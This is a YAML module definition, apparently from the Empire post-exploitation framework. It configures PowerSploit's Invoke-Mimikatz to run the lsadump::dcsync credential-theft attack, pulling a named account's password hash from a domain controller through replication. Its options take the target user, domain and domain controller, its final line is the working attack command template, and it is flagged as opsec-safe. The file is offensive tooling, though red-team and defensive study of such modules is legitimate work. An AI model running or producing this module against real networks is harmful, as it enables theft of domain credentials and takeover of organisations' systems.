name: Invoke-Mimikatz DCsync
authors:
  - name: Benjamin Delpy
    handle: '@gentilkiwi'
    link: https://twitter.com/gentilkiwi
  - name: Vincent Le Toux
    handle: ''
    link: ''
  - name: Joseph Bialek
    handle: '@JosephBialek'
    link: https://twitter.com/JosephBialek
description: Runs PowerSploit's Invoke-Mimikatz function to extract a given account password through Mimikatz's lsadump::dcsync
  module. This doesn't need code execution on a given DC, but needs to be run from a user context with DA equivalent privileges.
software: S0002
tactics: []
techniques:
  - T1098
  - T1003
  - T1081
  - T1207
  - T1075
  - T1097
  - T1145
  - T1101
  - T1178
background: true
output_extension:
needs_admin: false
opsec_safe: true
language: powershell
min_language_version: '2'
comments:
  - http://blog.gentilkiwi.com
  - http://clymb3r.wordpress.com/
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: user
    name_in_code: /user
    description: Username to extract the hash for (domain\username format).
    required: true
    value: ''
  - name: domain
    name_in_code: /domain
    description: Specified (fqdn) domain to pull for the primary domain/DC.
    required: false
    value: ''
  - name: dc
    name_in_code: /dc
    description: Specified (fqdn) domain controller to pull replication data from.
    required: false
    value: ''
script_path: credentials/Invoke-Mimikatz.ps1
script_end: Invoke-Mimikatz -Command '"lsadump::dcsync {{ PARAMS }}"';
advanced:
  option_format_string: '{{ KEY }}:{{ VALUE }}'
